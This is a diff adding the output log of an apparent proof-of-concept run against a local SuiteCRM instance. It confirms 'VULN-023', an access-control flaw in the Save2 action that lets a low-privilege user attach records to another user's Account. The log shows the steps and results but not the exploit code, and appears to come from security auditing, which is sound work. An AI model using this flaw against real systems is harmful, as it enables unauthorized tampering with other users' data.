@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-023/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-023/../.venv
+========================================================================
+VULN-023: Save2 -- relate arbitrary records onto any parent (no ACL)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login
+[SETUP] provisioning victim (V) and attacker (A) -- fresh, unrelated low-priv users
+[INFO] victim   = mod_3ce0f8b1 (da2826bc-e590-4331-a965-1a17de95ad9b)
+[INFO] attacker = mod_7165a6f5 (1eb995b3-a66b-4e74-bafd-957fd17fe291)
+[SETUP] as V: create an Account (owned by V, no relation to A)
+[OK] Account created: 8384e206-4b36-4777-97c0-4a250db90fed (V023Acc_b263fc42), owned by V
+[SETUP] as A: create A's OWN Contact (owned by A, no relation to V's Account)
+[OK] Contact created: a5e3fa52-6c22-4769-a192-4432afaa3f08 (last_name=A023Contact_c4d64217), owned by A, NOT related to V's Account
+[STEP] confirm no accounts_contacts row links V's Account to A's Contact yet; baseline V's Account row
+[INFO] pre-attack relationship row (expect empty): ''
+[INFO] V's Account BEFORE (modified_user_id, date_modified): 'da2826bc-e590-4331-a965-1a17de95ad9b\t2026-09-28 20:49:22'
+[STEP] as A (no ownership/ACL on V's Account): Save2 relates A's own Contact onto V's Account
+[INFO] attack response status=200 len=0
+[PROOF] re-querying accounts_contacts + V's Account row AFTER the attacker's Save2
+[PROOF] accounts_contacts AFTER attack: '98bdc931-79f6-40ea-a7a4-e3109efb4921\t0'
+[PROOF] V's Account AFTER attack (modified_user_id, date_modified): '1eb995b3-a66b-4e74-bafd-957fd17fe291\t2026-09-28 20:49:24'
+[OK] attacker A (no ACL on V's Account) forced a relationship between A's own Contact and V's Account; accounts_contacts row created, V's Account modified_user_id now=1eb995b3-a66b-4e74-bafd-957fd17fe291
+==> VULN-023: CONFIRMED — non-owner A related Contact a5e3fa52-6c22-4769-a192-4432afaa3f08 to V's Account 8384e206-4b36-4777-97c0-4a250db90fed via Save2, no ACL check
